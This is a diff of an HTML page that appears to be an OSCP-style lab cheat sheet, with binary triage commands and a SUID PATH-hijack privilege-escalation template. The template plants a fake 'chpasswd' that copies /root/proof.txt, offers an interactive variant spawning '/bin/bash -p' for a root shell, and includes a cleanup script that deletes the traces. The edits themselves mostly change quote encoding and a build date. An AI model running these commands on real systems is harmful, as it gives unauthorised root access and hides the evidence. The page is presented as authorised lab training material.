+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>bin<span class="w">                                  </span><span class="c1"># "not stripped" = function names survive</span>
 strings<span class="w"> </span>-a<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40<span class="w">                 </span><span class="c1"># system / popen / exec / bare command names</span>
-objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;/&lt;main&gt;:/,/^$/p&#39;</span>
-readelf<span class="w"> </span>-d<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;BIND_NOW|FLAGS&#39;</span><span class="w"> </span><span class="c1"># full RELRO =&gt; forget GOT overwrite</span>
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">'/&lt;main&gt;:/,/^$/p'</span>
+readelf<span class="w"> </span>-d<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">'BIND_NOW|FLAGS'</span><span class="w"> </span><span class="c1"># full RELRO =&gt; forget GOT overwrite</span>
 objdump<span class="w"> </span>-s<span class="w"> </span>-j<span class="w"> </span>.rodata<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w">          </span>#<span class="w"> </span>resolve<span class="w"> </span>the<span class="w"> </span>strings<span class="w"> </span>passed<span class="w"> </span>to<span class="w"> </span>system<span class="o">()</span>
 </pre></div>
 <p>Reconstructing source from a small binary:</p>
@@ -1941,37 +1941,37 @@ objdump<span class="w"> </span>-s<span class="w"> </span>-j<span class="w"> </sp
 <hr />
 <h3>Privesc — PATH hijack template</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/x.XXXXXX<span class="k">)</span>
-cat<span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span><span class="w"> </span><span class="s">&lt;&lt;&#39;EOF&#39;</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span><span class="w"> </span><span class="s">&lt;&lt;'EOF'</span>
 <span class="s">#!/bin/bash</span>
 <span class="s">id &gt; /tmp/root_id.txt</span>
 <span class="s">cat /root/proof.txt &gt; /tmp/root_proof.txt 2&gt;&amp;1</span>
 <span class="s">chmod 644 /tmp/root_id.txt /tmp/root_proof.txt</span>
 <span class="s">EOF</span>
-chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
 
 <span class="c1">## name the faked binary exactly as the SUID program invokes it</span>
-<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
 
 cat<span class="w"> </span>/tmp/root_id.txt
 </pre></div>
 <p>Works only when the SUID binary calls <code>setuid(0)</code>/<code>seteuid(0)</code> <strong>before</strong> <code>system()</code>. If it does
 not, the shell drops privileges and the payload runs as you. Check the disassembly order first.</p>
 <p>Interactive variant:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash\n/bin/bash -p\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span><span class="p">;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
-<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">'#!/bin/bash\n/bin/bash -p\n'</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span><span class="p">;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
 </pre></div>
 <hr />
 <h3>Cleanup</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/c.XXXXXX<span class="k">)</span>
-<span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash\nrm -f /tmp/root_id.txt /tmp/root_proof.txt; rm -rf /tmp/x.*\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
-chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
-<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
-ls<span class="w"> </span>-la<span class="w"> </span>/tmp/root_id.txt<span class="w">        </span>#<span class="w"> </span>must<span class="w"> </span>be<span class="w"> </span><span class="s2">&quot;No such file or directory&quot;</span>
+<span class="nb">printf</span><span class="w"> </span><span class="s1">'#!/bin/bash\nrm -f /tmp/root_id.txt /tmp/root_proof.txt; rm -rf /tmp/x.*\n'</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
+ls<span class="w"> </span>-la<span class="w"> </span>/tmp/root_id.txt<span class="w">        </span>#<span class="w"> </span>must<span class="w"> </span>be<span class="w"> </span><span class="s2">"No such file or directory"</span>
 </pre></div></div></section>
 
     <footer>
       <span>Authorised lab environment · flags and credentials are lab-specific</span>
-      <span><a href="https://github.com/AV10V/OSCP">source on GitHub</a> · built 23 November 2026</span>
+      <span><a href="https://github.com/AV10V/OSCP">source on GitHub</a> · built 24 November 2026</span>
     </footer>
   </main>
 </div>
